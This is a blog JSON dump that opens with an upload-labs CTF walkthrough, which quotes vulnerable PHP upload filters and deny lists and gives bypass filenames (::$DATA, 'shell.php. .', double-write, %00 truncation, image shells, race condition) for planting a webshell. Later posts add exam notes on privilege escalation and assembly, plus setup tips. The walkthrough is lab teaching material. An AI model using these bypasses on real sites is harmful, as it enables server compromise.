(isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 还是黑名单，但是没有对后缀名进行去::$DATA处理，利用windows特性，可在后缀名中加::$DATA绕过： 第9关 点+空格+点123456789101112131415161718192021222324252627282930&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 黑名单过滤，注意下面这行和之前不太一样，路径拼接的是处理后的文件名: 1$img_path = UPLOAD_PATH.'/'.$file_name; 原理同Pass-06，上传文件名后加上点+空格+点 1shell.php. . 第10关 嵌套绕过123456789101112131415161718192021&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 只是的删除： 1$file_name = str_ireplace($deny_ext,\"\", $file_name); 以利用双写(嵌套)绕过 1shell.pphphp 第11关 GET型00截断1234567891011121314151617181920&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125;?&gt; 白名单判断，但是$img_path直接拼接: 1$img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; 因此可以利用%00截断绕过： 需关闭magic_quotes_gpc php 版本&lt;5.3.4 第12关 POST型00截断1234567891011121314151617181920&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传失败\"; &#125; &#125; else &#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125;?&gt; save_path是通过post传进来的: 1$img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; 还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。 第13关 图马123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpfunction getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125;?&gt; getReailFileType函数只会读取文件的前两个字节: 12$file = fopen($filename, \"rb\");$bin = fread($file, 2); //只读2字节 所以我们伪造一个文件头即可，使用图马可以轻松绕过。利用的话，还需要结合文件包含漏洞。 第14关 getimagesize123456789101112131415161718192021222324252627282930313233&lt;?phpfunction isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125;?&gt; 校验了文件头： 1$info = getimagesize($filename); 利用图片马就可进行绕过 第15关 exif_imagetype12345678910111213141516171819202122232425262728293031323334353637&lt;?phpfunction isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125;?&gt; php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过： 1$image_type = exif_imagetype($filename); 第16关 二次渲染绕过1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = \"该文件不是png格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else&#123; $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; &#125;&#125;?&gt; 本关综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染. https://yang1k.github.io/2018/08/30/upload-pass16/ 第17关 条件竞争12345678910111213141516171819202122232425&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125;?&gt; 利用条件竞争删除文件时间差绕过。这里先将文件上传到服务器，然后通过rename修改名称： 123$upload_file = UPLOAD_PATH . '/' . $file_name;$img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext;rename($upload_file, $img_path); 再通过unlink删除文件: 1unlink($upload_file); 因此可以通过条件竞争的方式在unlink之前，访问webshell。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/tags/CTF/"},{"name":"Upload","slug":"Upload","permalink":"https://singlemindedt.github.io/tags/Upload/"}]},{"title":"DVWA相关记录","slug":"DVWA相关记录","date":"2020-08-02T06:09:37.000Z","updated":"2020-08-02T07:51:48.970Z","comments":true,"path":"2020/08/02/DVWA相关记录/","link":"","permalink":"https://singlemindedt.github.io/2020/08/02/DVWA相关记录/","excerpt":"","text":"根目录下对应目录名访问： 1我的：http://127.0.0.1/DVWA-master/ 使用admin&amp;password登录； 例：已知密码为4位数字，爆破密码 连接：http://10.20.64.138/brute.php get请求， 12pass is errorhint: isset($_REQUEST['pass']) 访问： http://10.20.64.138/brute.php?pass=1234 BP拦截， Send to Intruder Payload Positions 确定攻击目标 Payloads Payload Sets 模块，设置type为Number； 随机 数字特征 +++ 自定义迭代器","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://singlemindedt.github.io/tags/DVWA/"}]},{"title":"Gitbook安装与使用","slug":"Gitbook安装与使用","date":"2020-08-01T04:34:24.000Z","updated":"2020-08-01T05:59:29.508Z","comments":true,"path":"2020/08/01/Gitbook安装与使用/","link":"","permalink":"https://singlemindedt.github.io/2020/08/01/Gitbook安装与使用/","excerpt":"","text":"安装 推荐搭配：Git + Gitbook + Typora 环境： GitBook 是基于 Node.js，所以我们首先需要安装 Node.js（安装 Node.js 都会默认安装 npm（node 包管理工具），所以我们不用单独安装 npm） 安装Gitbook 1npm install -g gitbook-cli 等待安装完毕。 使用新建文件夹比如MyGitBook,命令行执行gitbook init; +++ 注意： 可能遇到以下问题： 或 installing gitbook xxx 时间过长 解决方法： 由于安装过程默认使用国外镜像，速度较慢或连接超时，可以将其切换为国内镜像； 命令行下：npm config set registry=http://registry.npm.taobao.org直接设置镜像 打开nodejs安装文件夹下面的子目录node_modules\\npm\\npmrc，添加配置registry=http://registry.npm.taobao.org +++ Installing GitBook 3.2.3执行完毕后，如下： 会在MyGitBook下创建，README.md和SUMMARY.md文件； 123- GitBook - README.md(介绍文件) - SUMMARY.md(目录文件) +++ 终端输入girbook serve即可开启一个 localhost:4000 的服务，请在浏览器中输入 http://localhost:4000 即可访问服务。 +++ 此时会在MyGitBook目录下生成_book目录，其中是index.html和一些配置文件； gitbook serve本身包括了gitbook build命令，执行 gitbook build 命令构建书籍，默认将生成的静态网站输出到 _book 目录； +++ 参考： 1 2","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"Markdown语法记录","slug":"Markdown语法记录","date":"2020-07-31T15:51:42.000Z","updated":"2020-08-02T05:54:55.084Z","comments":true,"path":"2020/07/31/Markdown语法记录/","link":"","permalink":"https://singlemindedt.github.io/2020/07/31/Markdown语法记录/","excerpt":"","text":"颜色、字体、大小测试0 1&lt;font color=#ff000 face=\"黑体\" size=4&gt;测试0&lt;/font&gt; 测试1 1&lt;font color =#000000 face =\"华文彩云\" size=4&gt;测试1&lt;/font&gt; 注释 代码法 123&lt;div style='display: none'&gt;注释0&lt;/div&gt; html注释 既然支持html语法，那也支持html注释，快捷键 comment + /。 123456&lt;!--注释1--&gt;&lt;!--多段注释，2 --&gt; hack方法 hack方法就是利用markdown的解析原理来实现注释的。 一般有的markdown解析器不支持上面的注释方法，这个时候就可以用hack方法。 hack方法比上面2种方法稳定得多，但是语义化太差。 1234[//]: # (哈哈我是最强注释，不会在浏览器中显示。)[^_^]: # (哈哈我是最萌注释，不会在浏览器中显示。)[//]: &lt;&gt; (哈哈我是注释，不会在浏览器中显示。)[comment]: &lt;&gt; (哈哈我是注释，不会在浏览器中显示。) 此处参考：择势勤","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"Docker-notes1","slug":"Docker-notes1","date":"2020-07-31T05:14:01.000Z","updated":"2020-07-31T15:56:47.392Z","comments":true,"path":"2020/07/31/Docker-notes1/","link":"","permalink":"https://singlemindedt.github.io/2020/07/31/Docker-notes1/","excerpt":"","text":"喜欢钻研和分享； 只要学不死就往死里学; 概念 Problems： 我在我的电脑上可以运行？？？ 配置应用环境麻烦，且不可跨平台 打包项目带上环境（镜像）–&gt;（Docker仓库=商店）–&gt;下载我们发布的镜像，可直接运行！ 思想来源：集装箱jre:多个应用（端口冲突），交叉；核心：隔离，每个集装箱都是互相隔离的；通过隔离机制可将服务器利用到极致！","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"pycharm开发flask指定ip、端口无效","slug":"pycharm开发flask指定ip、端口无效","date":"2020-06-20T16:16:09.000Z","updated":"2020-06-20T16:17:18.697Z","comments":true,"path":"2020/06/21/pycharm开发flask指定ip、端口无效/","link":"","permalink":"https://singlemindedt.github.io/2020/06/21/pycharm开发flask指定ip、端口无效/","excerpt":"","text":"pycharm开发flask指定ip、端口无效 python—–flask项目端口设置无效","categories":[],"tags":[{"name":"flask","slug":"flask","permalink":"https://singlemindedt.github.io/tags/flask/"}]},{"title":"网络攻击与防御复习","slug":"网络攻击与防御复习知识点总结","date":"2020-06-12T05:20:08.000Z","updated":"2020-06-12T09:07:20.241Z","comments":true,"path":"2020/06/12/网络攻击与防御复习知识点总结/","link":"","permalink":"https://singlemindedt.github.io/2020/06/12/网络攻击与防御复习知识点总结/","excerpt":"","text":"[TOC] +++ 1、Web安全 2、逆向安全 3、移动通信安全 题型：论述题：3*10 （简答题，记忆） 材料分析题：20 （代码相关web or 代码无关） 代码分析题：20+30 （20Web/30RE） +++ +++ +++ Web方面代码主要考：PHP代码 +++ 1、代码审计与渗透测试的区别和优缺点☆☆☆ 渗透测试（威胁：来自外部入侵） 代码审计（脆弱性：系统自身、软件等问题） 描述 模拟黑客攻击，评估目标系统安全性 查找程序中存在的不安全编码 测试目标 包括但不限于Web应用 基于提供的系统代码，寻找代码漏洞 测试产出 渗透测试报告+修复建议 代码审计报告+修复建议 优点 贴近实际场景，远程渗透 全面审查，贴近系统和架构，修复成本低 缺点 测试不全面，修复成本高 现场审计 +++ 2、代码审计流程 拿到源代码后，先使用工具进行整体扫面，然后对扫描结构进行人工漏洞确认，同时，进行人工安全编码审计，进而解决一些常规漏洞和逻辑漏洞。最后综合审计结构，编写并提交代码审计报告。 +++ 3、代码审计的通用方法 +++ 4、PHP代码审计：代码分析（XSS、文件上传、文件包含、代码执行、CSRF等） 反序列化漏洞☆☆☆ +++ +++ 查看渗透测试案例； +++ 1、渗透测试的流程和每一步要做的工作渗透测试分为七个阶段： 1、 前期交互阶段 2、 情报搜集阶段 3、 威胁建模阶段 4、 漏洞分析阶段 5、 渗透攻击阶段 6、 后渗透攻击阶段 7、 报告阶段 1、前期交互阶段 确定渗透测试的范围（允许测试）和目标（预期效果） 测试的类型（黑盒/白盒） 时间段、费用等 目标： 列出所有漏洞 证明各种漏洞存在 测试各种事件响应 对网络、系统或应用程序漏洞的渗透模块开发 2、情报搜集阶段（最重要阶段之一，40-60%） 采用各种方式尽可能收集目标网络的信息 大致步骤： 1、 目标选择：选择攻击目标，确定攻击效果 2、 隐私收集：现场手机+外部收集 3、 踩点工作：主动和被动扫描技术 4、 验证目标的安全机制：防火墙、网络流量过滤系统、网络和主机的保护措施 3、威胁建模阶段 模拟出对目标的威胁以及威胁的作用，根据威胁可能对目标系统产生的影响进行分类 结合信息收集阶段作出的分析，确定最佳的攻击方式 需要解决的问题： 如何攻击指定的网络？ 需要获取的重要信息是什么？ 采取什么攻击方式最合适？ 对目标最大的安全威胁是什么？ (漏洞扫描工具（ Nexpose或 Metasploit Pro）可以帮助自动化的快速的完成威胁建模) 4、漏洞分析阶段 5、渗透攻击阶段 渗透攻击阶段可以利用以前漏洞分析阶段的成果，是真正的攻击阶段 6、后渗透攻击阶段 后渗透攻击阶段包括了当成功渗透攻击到对方计算机以后的很多任务，比如提权、上传和下载文件、跳板攻击等 （以特定的业务系统为目标，识别岀关键基础设施，并寻找客户最有价值的资产） 7、报告阶段报告的主要组成部分： 确定目标最为重要的威胁 将渗透测试得到的数据生成表格和图表 对目标系统的改进建议 对问题的修复方案 +++ +++ 需要用自己的语言描述； +++ 1、为什么要提权？提权：利用操作系统或应用软件中的程序错误、设计缺陷或配置不当来获取受保护资源的高级访问权限 后渗透测试阶段，获得了目标系统低权限的Shell，对目标的某些访问依旧受限 需要进行提权操作，来获得目标系统的最高权限 +++ 2、提权的方法和步骤/不同操作系统下的提权技术1、Windows系统提权的一般步骤 利用内核漏洞提权（MS13_053 etc.） 利用操作系统漏洞提权： 利用应用程序漏洞提权 2、Linux系统提权 SUID程序提权 修改用户属组（文件权限配置不当） 修改/etc/ passwd 修改root用户ssh密钥 通配符提权 应用程序提权 3、数据库UDF提权UDF:User Defined Function 前提条件： 获得root账户密码 数据库开启 plugin 数据库监听公网 4、Redis提权（未授权访问等漏洞）Redis数据库以root权限启动，配合未授权访问漏洞，攻击者可以连接数据库并写入ssh密钥，接着就可以以root用户身份登录服务器 +++ 3、提权的防御 及时打补丁 启动Web、DB服务时以低权限启动（最小权限原则） 服务只监听127.0.0.1（不要开在公网） +++ +++ 最后一题30分（RE，分析汇编语言代码；给出高级语言用汇编分析/给出任务要求写出汇编；课上用到的—关于堆栈方面的汇编代码） 给出汇编，说明该段代码的具体意义，如何工作； 调用约定，四种常见的，堆栈的变化：根据代码画出堆栈变化情况； （堆，不考） +++ 1、字节序 函数栈&amp;EIP、EBP、ESP 将ebx、exi、edi压入栈的原因： 123push ebppush esipush edi 保存寄存器原有的值（保存在了栈上）（栈帧切换时不能破坏上一个函数中某些寄存器的值，寄存器只有一份，现在寄存器归我用，可能改变寄存器的值，导致函数返回时回不去，所以要保存原有的值。） rep stosd 循环指令，循环ecx次（14次）往eax里填充CCCCCCCC（填C的原因：把之前的垃圾数据清空，INT3中断） 1234lea edi,dword ptr ss:[ebp-50]//lea取偏移地址mov ecx,14mov eax,CCCCCCCCrep stosd ds段（数据段）； 123456mov al,byte ptr ds:[424A30]mov byte ptr ss:[ebp-4],al.......... 由于无法在内存中传递数据，所以先把内存数据传入CPU，再从CPU传到内存的栈上去 对字符串操作，传的是字符串的地址 1mov dword ptr ss:[ebp-10],zijixu.424A38:&quot;abcde&quot; 异或操作 1xor eax,eax 清零操作，代表return 0；默认函数返回值都是放在eax里，通过异或操作将返回值置零； 为什么不用mov eax,0x0清零? 效率低，占内存 还原栈 12mov esp,ebp//将pop ebp 将栈顶的地址弹到EIP中 1ret +++ 压栈ecx，此时栈顶esp就是ecx里的值，故之后打印的结果应该都是ecx的值； +++ 2、汇编基础（给定代码能说明其含义） +++ 3、调用约定（相关的汇编代码分析和栈的变化情况）☆☆☆ 栈帧：程序运行时栈中分配的内存块，专门用于特定的函数调用 栈帧的大致结构： 调用一个函数时的操作步骤： 调用方将被调用函数所需参数放入到函数所采用的调用约定指定的位置 调用方将控制权转交给被调用函数（call），然后返回地址被保存到程序栈或CPU寄存器中 被调用函数为局部变量分配空间 被调用函数执行操作 被调用函数完成操作，释放局部变量的栈空间 被调用函数将控制权返还给调用方（ret） +++ +++ +++ cdecl☆☆☆ 123456add esp,10h //相当于调用方清栈(调用方调整栈帧))（esp+10h,由于栈在内存中表现为从高地址往低地址增长，esp栈顶+16相当于压缩栈）1、先进后出。2、在内存中表现为从高地址往低地址增长。(从高地址压栈-&gt;低地址)3、栈顶esp：栈的最上方（低地址区）。4、栈低ebp：栈的最下方（高地址区）。 +++ stdcall 打开被调用方： 12retn 10h //被调用方清栈(被调用方调整栈帧)；ret先返回到EIP，随后，相当于add esp,10h参数固定 +++ fastcall调用方： 被diao 123mov [ebp+var_C],edxmov [ebp+var_8],ecx//保存寄存器中的值，防止后边程序使用寄存器而改变其值 1retn 8 //被调用方清栈(被调用方调整栈帧)；ret先返回到EIP，随后，相当于add esp,8 +++ thiscall对象存在于堆上，不在栈里； 调用方： ecx中存放当前调用的对象的指针this； eax默认存放返回值； 被调用方： 123lea ecx,[ebp+var_4]//this指针获取retn 8 //被调用方清栈(被调用方调整栈帧)；ret先返回到EIP，随后，相当于add esp,8 +++ +++ 4、简单的软件保护技术举例 +++ 5、Windows的内核原理 +++ +++ 发展过程中的变化； +++ 1、移动网络的分类和安全风险分类： 无线局域网（WLAN）、无线个域网（WPAN）、无线体域网（WBAN）、无线城域网（WMAN）、无线广域网（WWAN） 安全风险： 有线网络 无线网络 +++ 2、WLAN安全机制—-WEP，IEEE 802.11i(WPA、WPA2、CCMP、TKIP、认证密钥交换、四步握手等)1、WEP +++ WEP的安全问题： RC4算法的使用（存在大量弱密钥；每256个密钥就有一个；建议：抛弃RC4输出的前256比特） Ⅳ的使用（空间太小，生日攻击） SK的产生与分发（无密钥交换/管理机制） CRC32算法的使用（CRC32是线性的） 无抗重放攻击 +++ 2、IEEE 802.11i TSN(过度安全网络) RSN（坚固安全网络） 3、WPA802.11i草案中一部分； 4、加密机制TKIP—（暂时密钥完整性协议） 5、加密机制CCMP—基于AESCCMP☆☆☆ +++ +++ +++ 3、移动通信安全机制—-GSM、3G、4G1、GSM +++ GSM系统的安全目标： 用户身份认证：保证网络不被未授权者使用 数据机密性： 用户身份（IMSI）保密： IMSI（国际移动用户标识）不被泄露给未授权的个人、实体或过程 +++ GSM安全分析： 认证：挑战—-响应，长期密钥没有泄露 加密：空中接口（即用户到基站部分） 匿名：TMSI GSM的不足： 认证：单向认证，且三元组可无限期使用 加密：没有实现端到端的加密 完整性：无 +++ 2、3G☆☆☆认证和密钥协商过程 +++ 3G的安全目标： 对用户模块（UE）进行认证，特别是用户服务标识模块（USIM） 向UE和服务网络SN提供会话密钥 在会话密钥的保护下在UE和SN之间建立安全连接 3G的层次： 应用层 归属/服务层 传输层 +++ 3G安全功能结构 增强用户身份保密EUIC（ Enhanced User Identity Confidentiality）：通过归属网对移动用户智能卡身份信息进行认证 用户身份保密UIC（ User Identity Confidentiality） 认证和密钥协商AKA（ Authentication&amp; Key agreement）：用于USIM卡、VLR、HLR间进行双向认证和密钥分发 用户及信令数据保密DC：加密UE与RNC间信息 消息认证DI：认证消息的完整性、时效以及消息的来源地与目的地 +++ 3、4G 4G系统的组成： 移动终端 无线接入网 无线核心网 IP骨干网 4G的安全威胁 现有的无线网络和Internet的安全威胁依然存在 4G的终端与各种应用的交互更为复杂，威胁也越多","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"P2P networking based internet of things (IoT) sensor node authentication by Blockchain","slug":"P2P networking based internet of things (IoT) sensor node authentication by Blockchain(基于P2P网络的物联网（IoT）传感器节点区块链认证)","date":"2020-05-29T10:20:08.000Z","updated":"2020-07-29T11:05:24.949Z","comments":true,"path":"2020/05/29/P2P networking based internet of things (IoT) sensor node authentication by Blockchain(基于P2P网络的物联网（IoT）传感器节点区块链认证)/","link":"","permalink":"https://singlemindedt.github.io/2020/05/29/P2P networking based internet of things (IoT) sensor node authentication by Blockchain(基于P2P网络的物联网（IoT）传感器节点区块链认证)/","excerpt":"","text":"P2P networking based internet of things (IoT) sensor node authentication by Blockchain(基于P2P网络的物联网（IoT）传感器节点区块链认证)Abstract传感器节点在物联网环境中起着重要作用，每个传感器都是对等网络。由于物理尺寸有限，物联网 传感器节点必须具有轻量认证协议。物联网（IoT）是各种技术的集合 元素。期望异构终端，网络和应用程序之间的互通。他们会加速 通过物联网平台的开放。结果，物联网将出现许多技术和管理安全威胁 环境。传感器节点协议必须轻巧且安全。由于物联网设备有多种用途，因此 需要性能的设备，具有可正常工作的高性能芯片组的操作系统，大多数密码协议。但是，转 点亮/熄灭IoT设备执行简单的任务，例如基于不运行OS的低性能芯片组。如果有 不支持加密协议或证书，则容易受到攻击，并且性能不足以处理。因此， 本文提出了一种基于区块链的物联网设备，以获取更安全的身份验证方案。 Keywords： P2P networking . Sensor network . Secure IoT . Node authentication . Light-weight protocol . Network security 1 Introduction物联网（IoT）服务容易受到各种攻击 物联网技术的本质带来的安全威胁。特别是，它具有有限的硬件规格，例如低功耗 消耗，少量内存，低内存等， 并且往往分布在难以管理的环境中，这可能会带来各种安全威胁 包括物理攻击的因素。这些特征可以 导致物联网服务安全运行中的致命错误 平台或基于错误信息提供服务， 导致物联网服务平台失去其功能[1]。 近年来，预计互操作性 异构终端，网络和应用程序之间 将通过物联网平台的开放而加速， 导致各种技术和行政安全 威胁。物联网环境中可能发生的安全威胁 继承现有威胁中可能发生的威胁 ICT（信息和通信技术）环境。机密性，完整性和可用性（CIA）可以 通常被视为对合法商品的使用和交付的威胁 服务，通常被称为CIA，这三个主要 信息安全的组成部分[2]。表1显示了 物联网每个组件中可能发生的安全威胁[3]。 